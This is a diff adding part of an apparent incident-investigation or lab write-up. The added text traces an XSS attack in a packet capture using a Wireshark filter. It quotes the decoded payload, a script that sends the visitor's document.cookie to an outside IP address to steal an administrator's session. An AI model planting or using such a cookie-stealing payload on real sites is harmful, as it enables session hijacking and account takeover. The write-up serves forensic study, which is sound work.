@@ -46,3 +46,13 @@ This indicates that the attacker used Gobuster version 3.6 to perform directory 
 
 ## Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?
 
+Since the attack involved Cross-Site Scripting (XSS), I looked for HTTP POST requests containing script-related content. I used the following Wireshark filter: `http.request.method == POST and http contains "script"` 
+This led me to a POST request to `reviews.php`, where I found a URL-encoded XSS payload in the review parameter.
+
+![XSS](screenshot/xss_payload.png)
+
+After decoding the payload, it was: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
+The payload was designed to steal the administrator's session cookie and send it to the attacker's IP address.
+
+## Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?
+
